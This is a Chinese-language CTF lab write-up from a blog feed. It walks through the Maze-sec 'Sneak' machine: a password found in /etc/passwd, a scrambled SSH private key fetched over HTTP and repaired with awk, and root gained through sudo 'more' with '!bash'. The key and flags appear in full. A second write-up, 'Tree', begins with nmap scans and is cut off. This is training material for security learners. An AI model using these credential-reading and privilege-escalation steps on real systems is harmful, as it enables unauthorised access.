gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><h1 id="四、获取USER权限"><a href="#四、获取USER权限" class="headerlink" title="四、获取USER权限"></a>四、获取USER权限</h1><p>查看<code>/etc/passwd</code>，发现user用户的密码为<code>user@123</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Sneak:/home/user$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin<br>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin<br>user:x:1001:1001:user@123:/home/user:/bin/bash<br>sysadm:x:1002:1003:Where is my license?:/home/sysadm:/bin/bash<br></code></pre></td></tr></table></figure><p>获取user权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Sneak:/home/user$ su user<br>Password: <br>user@Sneak:~$ <span class="hljs-built_in">id</span><br>uid=1001(user) gid=1001(user) <span class="hljs-built_in">groups</span>=1001(user)<br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">user</span>@Sneak:~$ cat <span class="hljs-keyword">user</span>.txt <br>flag&#123;<span class="hljs-keyword">user</span>-<span class="hljs-number">9</span>fcae37cb857fb5fc6f8d74c82a5d0ga&#125;<br></code></pre></td></tr></table></figure><h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><h2 id="1、获取sysadm权限"><a href="#1、获取sysadm权限" class="headerlink" title="1、获取sysadm权限"></a>1、获取sysadm权限</h2><p>在<code>/etc/passwd</code>里面提示<code>sysadm:x:1002:1003:Where is my license?:/home/sysadm:/bin/bash</code><br>同时在<code>/cms/license.txt</code>找到私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/Maze-sec/sneak]<br>└─# curl http://192.168.2.57/cms/license.txt<br>-----YEK ETAVIRP HSSNEPO NIGEB-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>sAdd/5SMN1KWatGo/1evq+7bfETGlpGM2U5Oi7e8nMF2/mDX2PJzAEYAAAQAAEwAAAAAhN<br>8vtXIS94jYewIuOQ3qS5ya5ET3o0Ok33k5m9oy+ekd2A8oHiJJUBD8CPst/BR4PMM+OIYq<br>CugO2A2hUNf4TK8+J/RSLgmuZ9PW5KHzTezkcuONjFFWCvgtGzY1YrCzvIjdVZn9JAngQ9<br>g/MRe8qLORDFocrlGt+h4NUfrgxaoBQhJfiMZ9ygZA1xYdC/5JtCuXeAvM69jREOaxLA13<br>zC2umAuwE4CUKEenEK2+4B4JRkq1wcVOYR8DeAbnAb/lvn/edv2QS74OgBZizuTo9ZS+20<br>+kQNrEKqcPUv/CEjnOL5225HYA5WIUaOPbS4wIrPewLXMZ4UCJrDR5qh2VlJgGxbkx86Rj<br>vPy1xifMKxxT35lAOQGMysOhSaohFWCoSdqx7H8mQIlRAMK5+g8vRR0MLfG6/8dziq5QYl<br>CMF4kKogzmcOR6RVA+jTkVB821JKS3e46Y5DoKh7AAAFiBz2r4oc9q+KAAAAB3NzaC1yc2<br>H2IevEyV7LPLQX3fuETTtilWrB6ft3rq/+2HxkRZqBjNVuj4uH/JTh9v5wl9TyMABGAAAE<br>sCLjkN6kucmuRE96NDpN95OZvaMvnpHdgPKB4iSVAQ/Aj7LfwUeDzDPjiGKvUIJwCfZ2VX<br>QkziKvXEzPogLojNgdIVzH+kCvfyfk0CopbW/jVuyx8k3MJnrTzYRhlwLYrxMWN2qw8LyY<br>xaHK5RrfoeDVH64MWqAUISX4jGfcoGQNcWHQv+SbQrl3gLzOvY0RDmsSwNd9NvkmfaE7s4<br>1DnqCxaDEp/sgtrJgLMBuAlCh3JhitPeAeSEpaNMXlDWE/gHw2Jw2f575vX3rNk0OuDYQm<br>L/whI5zi+dtuR2AOViFGjj20uMCKz3sC1zGeFAiaw0eaodlZSYBsW5MfOkY5WEOaos3fP+<br>n5MIqCJeBjw7jcds4HjSc80deJgDkBjMrTokGaYhlAqUna8+BvJESZEAjSuPI/bUENzynh<br>DkekVQPo05FQfNtSSkt3uOmOQ6CoewAAAAMBAAEAAAGAFNe6UNkdX5fRSQfSisl/9NzSIg<br>wAgRSzrZkhHVUXz3+T373wkBttVkjAd1t8iNU0udXCg3cZcclCFHDIP345xlkqtDxFQMsf<br>RATRmnKH4if3O/0p/vRBmMPEwHEmHbP2f+K8gEdKsV1oLBGkqSV3jnH0To72q9UMvNavZY<br>eWD9b8W0hSdu+qkbmlcI9FZmL+yXWpoiag+RPlnaIyk+OjzHfcUwnp81JNCIA8fObRHgW7<br>aJ3Q/ySGXsj7F8FkdHvZMpPDK4ZKMRdx7UalxY14RlUi2500eZawNbFd/cPUkVFSPl/mlY<br>O4yLkC4jUKtXW8Vu2GDlVz495SE5yIDqsP2d6s5RHXNfMVxYySHF3CyIxLuq5vclyku4sr<br>OTe2CmPjFYfQSrF4JT0JhQBMWXIrRetIUiyQULFFYxSvQZ0xm/wBZDiO8npE+0dG/Czelb<br>AAAAxklCGnnTo1Jbjs0N9uhlvzyL5fXTibhUvVhIeIvVxF3xkODLXJxV/BqhnpwPDM+rMN<br>wGg79PTiKC6HwVFRxxQGnPufZ8Go1KeLfpJ0TR3RQ0TNPh54eFH/O+YAmTRDKeDU5fxrQY<br>MRqZx7/je0GTAwbbpEVcf20lYLDc0ygsCnRF92ZnB4N6/KWCsDoVxX2+e6nF54K8w//5O1<br>R9wxe4c/2e9ifWnYljQe9PzOoPOCdZgz1v1jYvON17T+MVuudygdNRLZw+ZgBf1xVQYHBu<br>yCg1p+s+ASIw01U5AEMAAAwWaHDSG/RHnoJw4qBeiUTA0H6Uudn0FcVuC9UApP5Z8dCdP0<br>8kiVzZNbGxOKTWNPvubFREDC3rOKfxwIqkMMm22Kl1zOOKRL5KQYUeIPgm/FE27Q204TLN<br>tkwzr/RuH9nGj4X3UF+gxjDed5QkMf7f10+8BkVVh8PULRxKuyCbZ7Rlp+TnGiJud35I1u<br>jSQ7sjSRRjY7zJaF+PddkcnleejwHcNy48WUSesTKRSZQfTwqWN5DGIL23/BRhRWUr4iKq<br>D60XD8ng8Emm8qz1oh2GcYjM22s3MIZZkDQwAAAAT2ZbedvPMgwrxScQulmYH9cZCOP9Fh<br>T5AHbmxc0QWQIKpIyhH4/w1BTXfeBmoRca80dhpMUK+idiYG9TOYW2yAczR3nCUYHhYuV2<br>ujfICkFANZoCfe8p/aYoWunCn8aHt9EosO6yIZ0+UNd9rrI3arzLr7OertbKaPMMLUJJqS<br>sX74l65qBqWMs8knQ2mxI6hmmZ+Tqvl+b2KqtsdML7VbLXTlfJmNxKwDnzMJ1QrINssBDx<br>==wBGUABDIQArFWZuNFQtRWYzl3cMAAAAkn2WUqipD5tU8<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>该私钥格式存在问题，经过对比，发现是单行数需要进行反转</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sneak]<br>└─# awk <span class="hljs-string">&#x27;NR%2==1&#123;for(i=length;i&gt;0;i--)printf &quot;%s&quot;, substr($0,i,1); print &quot;&quot;&#125;</span><br><span class="hljs-string">NR%2==0&#123;print&#125;&#x27;</span> license.txt &gt; sysadm.key<br></code></pre></td></tr></table></figure><p>得到正确的私钥</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kali)-[<span class="hljs-operator">/</span>miao<span class="hljs-operator">/</span>maze-sec<span class="hljs-operator">/</span>sneak]<br>└─<span class="hljs-comment"># cat sysadm.key         </span><br><span class="hljs-operator">-</span>----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEAzJP2XDm<span class="hljs-symbol">/2FMn8e7iO5U2MGplGTEfb7+qve1/oGtaWK1NMS5/ddAs</span><br><span class="hljs-number">8</span>vtXIS94jYewIuOQ3qS5ya5ET3o0Ok33k5m9oy<span class="hljs-operator">+</span>ekd2A8oHiJJUBD8CPst<span class="hljs-symbol">/BR4PMM+OIYq</span><br><span class="hljs-number">9</span>QgnAJ9nZVdjIvzCrY1YzGtgvCWFFjNOuckzeTzHK5WP9ZumgLSR<span class="hljs-symbol">/J+8KT4fNUh2A2OguC</span><br>g<span class="hljs-symbol">/MRe8qLORDFocrlGt+h4NUfrgxaoBQhJfiMZ9ygZA1xYdC/5JtCuXeAvM69jREOaxLA13</span><br><span class="hljs-number">02</span><span class="hljs-operator">+</span>SZ9oTuziZBgO47SQ2vde<span class="hljs-symbol">/nvl/bAnbAeD8RYOVcw1qkRJ4B4+2KEneEKUC4EwuAmu2Cz</span><br><span class="hljs-operator">+</span>kQNrEKqcPUv<span class="hljs-symbol">/CEjnOL5225HYA5WIUaOPbS4wIrPewLXMZ4UCJrDR5qh2VlJgGxbkx86Rj</span><br>lYQ5qizd8<span class="hljs-symbol">/6GfLM0RRv8g+5KMARlIQm8H7xqdSoCWFhoaShOsyMGQOAl53TxxKMfix1yPv</span><br>CMF4kKogzmcOR6RVA<span class="hljs-operator">+</span>jTkVB821JKS3e46Y5DoKh7AAAFiBz2r4oc9q<span class="hljs-operator">+</span>KAAAAB3NzaC1yc2<br>EAAAGBAMyT9lw5v9hTJ<span class="hljs-symbol">/Hu4juVNjBqZRkxH2+/qr3tf6BrWlitTTEuf3XQLPL7VyEveI2H</span><br>sCLjkN6kucmuRE96NDpN95OZvaMvnpHdgPKB4iSVAQ<span class="hljs-symbol">/Aj7LfwUeDzDPjiGKvUIJwCfZ2VX</span><br>YyL8wq2NWMxrYLwlhRYzTrnJM3k8xyuVj<span class="hljs-symbol">/WbpoC0kfyfvCk+HzVIdgNjoLgoPzEXvKizkQ</span><br>xaHK5RrfoeDVH64MWqAUISX4jGfcoGQNcWHQv<span class="hljs-operator">+</span>SbQrl3gLzOvY0RDmsSwNd9NvkmfaE7s4<br>mQYDuO0kNr3Xv575f2wJ2wHg<span class="hljs-symbol">/EWDlXMNapESeAePtihJ3hClAuBMLgJrtgs/pEDaxCqnD1</span><br>L<span class="hljs-symbol">/whI5zi+dtuR2AOViFGjj20uMCKz3sC1zGeFAiaw0eaodlZSYBsW5MfOkY5WEOaos3fP+</span><br>hnyzNEUb<span class="hljs-symbol">/IPuSjAEZSEJvB+8anUqAlhYaGkoTrMjBkDgJed08cSjH4sdcj7wjBeJCqIM5n</span><br>DkekVQPo05FQfNtSSkt3uOmOQ6CoewAAAAMBAAEAAAGAFNe6UNkdX5fRSQfSisl<span class="hljs-symbol">/9NzSIg</span><br>fsMQFxDtqklx543PIDHFClccZc3gCXdu0UNi8t1dAjkVttBkw373T<span class="hljs-operator">+</span><span class="hljs-number">3</span>zXUVHhkZrzSRgAw<br>RATRmnKH4if3O<span class="hljs-symbol">/0p/vRBmMPEwHEmHbP2f+K8gEdKsV1oLBGkqSV3jnH0To72q9UMvNavZY</span><br><span class="hljs-number">7</span>WgHRbOf8AICNJ18pnwUcfHzjO<span class="hljs-operator">+</span>kyIanlPR<span class="hljs-operator">+</span>gaiopWXy<span class="hljs-operator">+</span>LmZF9Iclmbkq<span class="hljs-operator">+</span>udSh0W8b9DWe<br>aJ3Q<span class="hljs-symbol">/ySGXsj7F8FkdHvZMpPDK4ZKMRdx7UalxY14RlUi2500eZawNbFd/cPUkVFSPl/mlY</span><br>rs4ukylcv5quLxIyC3FHSyYxVMfNXHR5s6d2PsqDIy5ES594zVlDG2uV8WXtKUj4CkLy4O<br>OTe2CmPjFYfQSrF4JT0JhQBMWXIrRetIUiyQULFFYxSvQZ0xm<span class="hljs-symbol">/wBZDiO8npE+0dG/Czelb</span><br>NMr<span class="hljs-operator">+</span>MDPwpnhqB<span class="hljs-symbol">/VxJXLDOkx3FxVvIeIhVvUhbiTXf5Lyzvlhu9N0sjbJ1oTnnGClkxAAAA</span><br>wGg79PTiKC6HwVFRxxQGnPufZ8Go1KeLfpJ0TR3RQ0TNPh54eFH<span class="hljs-symbol">/O+YAmTRDKeDU5fxrQY</span><br><span class="hljs-number">1</span>O5<span class="hljs-symbol">//w8K45Fn6e+2XxVoDsCWK/6N4BnZ29FRnCsgy0cDLYl02fcVEpbbwATG0ej/7xZqRM</span><br>R9wxe4c<span class="hljs-symbol">/2e9ifWnYljQe9PzOoPOCdZgz1v1jYvON17T+MVuudygdNRLZw+ZgBf1xVQYHBu</span><br><span class="hljs-number">0</span>PdCd8Z5PpAU9CuVcF0nduU6H0ATUieBq4wJonHR<span class="hljs-symbol">/GSDHaWwAAAMEA5U10wISA+s+p1gCy</span><br><span class="hljs-number">8</span>kiVzZNbGxOKTWNPvubFREDC3rOKfxwIqkMMm22Kl1zOOKRL5KQYUeIPgm<span class="hljs-symbol">/FE27Q204TLN</span><br>u1I53duJiGnT<span class="hljs-operator">+</span>plR7ZbCyuKxRLUP8hVVkB8<span class="hljs-operator">+</span><span class="hljs-number">01</span>f7fMkQ5deDjxg<span class="hljs-operator">+</span>FU3X4jGn9HuR<span class="hljs-symbol">/rzwkt</span><br>jSQ7sjSRRjY7zJaF<span class="hljs-operator">+</span>PddkcnleejwHcNy48WUSesTKRSZQfTwqWN5DGIL23<span class="hljs-symbol">/BRhRWUr4iKq</span><br>hF9POCZc9HYmluQcSxrwgMPvdebZ2TAAAAwQDkZZIM3s22MjYcG2ho1zq8mmE8gn8DX06D<br>T5AHbmxc0QWQIKpIyhH4<span class="hljs-symbol">/w1BTXfeBmoRca80dhpMUK+idiYG9TOYW2yAczR3nCUYHhYuV2</span><br>SqJJULMMPaKbtreO7rLzra3Irr9dNU<span class="hljs-operator">+</span><span class="hljs-number">0</span>ZIy6OsoE9tHa8nCnuWoYa<span class="hljs-symbol">/p8efCoZNAFkCIfju</span><br>sX74l65qBqWMs8knQ2mxI6hmmZ<span class="hljs-operator">+</span>Tqvl<span class="hljs-operator">+</span>b2KqtsdML7VbLXTlfJmNxKwDnzMJ1QrINssBDx<br><span class="hljs-number">8</span>Ut5DpiqUW2nkAAAAMc3lzYWRtQFNuZWFrAQIDBAUGBw<span class="hljs-operator">==</span><br><span class="hljs-operator">-</span>----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>得到权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sneak]<br>└─# ssh sysadm@192.168.2.57 -i sysadm.key <br>Warning: Permanently added <span class="hljs-string">&#x27;192.168.2.57&#x27;</span> (ED25519) to the list of known hosts.<br>Linux Sneak 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>sysadm@Sneak:~$ <span class="hljs-built_in">id</span><br>uid=1002(sysadm) gid=1003(sysadm) <span class="hljs-built_in">groups</span>=1003(sysadm)<br></code></pre></td></tr></table></figure><h2 id="2、more提权"><a href="#2、more提权" class="headerlink" title="2、more提权"></a>2、more提权</h2><p>使用<code>sudo -l</code>，发现可以<code>more</code>查看这个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysadm@Sneak:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> sysadm on Sneak:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User sysadm may run the following commands on Sneak:<br>    (ALL) NOPASSWD: /usr/bin/more /var/log/custom/fake-cleanup.sh<br></code></pre></td></tr></table></figure><p>但是文件长度不够导致无法分页进入shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysadm@Sneak:~$ /usr/bin/more /var/log/custom/fake-cleanup.sh<br><span class="hljs-comment"># System cleanup script - DO NOT MODIFY</span><br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h3 id="方法一：管道阻塞"><a href="#方法一：管道阻塞" class="headerlink" title="方法一：管道阻塞"></a>方法一：管道阻塞</h3><p>可以通过管道阻塞的方式进行提权，输入<code>!bash</code>即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysadm@Sneak:~$ <span class="hljs-built_in">echo</span> miao | <span class="hljs-built_in">sudo</span> /usr/bin/more /var/log/custom/fake-cleanup.sh<br>miao<br>!bash<br>root@Sneak:/home/sysadm# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><h3 id="方法二：修改stty"><a href="#方法二：修改stty" class="headerlink" title="方法二：修改stty"></a>方法二：修改stty</h3><ul><li>修改终端的<code>stty rows 2</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysadm@Sneak:~$ <span class="hljs-built_in">stty</span> rows 2<br>sysadm@Sneak:~$ <span class="hljs-built_in">sudo</span> /usr/bin/more /var/log/custom/fake-cleanup.sh<br><span class="hljs-comment"># System cleanup script - DO NOT MODIFY</span><br>!bash<br>root@Sneak:/home/sysadm# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure></li></ul><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Sneak:~# <span class="hljs-built_in">cat</span> root.txt <br>flag&#123;root-36bee2f8db4943b0f6c9d16afe11d454&#125;<br></code></pre></td></tr></table></figure><h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h2 id="1、ssh私钥"><a href="#1、ssh私钥" class="headerlink" title="1、ssh私钥"></a>1、ssh私钥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnN<br>...（中间省略）...<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><h2 id="2、more提权-1"><a href="#2、more提权-1" class="headerlink" title="2、more提权"></a>2、more提权</h2><p><code>more</code>的特性：</p><ul><li>在分页暂停时，<code>more</code>可以执行多种命令，其中以<code>!</code>开头的命令会在shell中执行。</li><li>例如，输入<code>!/bin/bash</code>会启动一个交互式shell。</li></ul><p>当输出文件的行数不满足分页时，可以通过下述方式实现分页暂停</p><ul><li>管道阻塞，<code>echo xxxx | sudo more</code></li><li>修改<code>stty</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
      <tag>ssh私钥格式</tag>
      
      <tag>sudo-more</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tree</title>
    <link href="/Maze-sec/Tree/"/>
    <url>/Maze-sec/Tree/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/tree]<br>└─# nmap -sn 192.168.2.0/24              <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-13 21:32 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00047s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00054s latency).<br>MAC Address: 08:00:27:D1:C4:24 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.56<br>Host is up (0.00051s latency).<br>MAC Address: 08:00:27:F1:AB:D3 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.11 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.56</code></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/tree]<br>└─# nmap --min-rate 10000 -p- 192.168.2.56                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-13 21:33 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.56<br>Host is up (0.00014s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:F1:AB:D3 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3.65 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/tree]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.56<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-13 21:33 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.56<br>Host is up (0.00093s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb 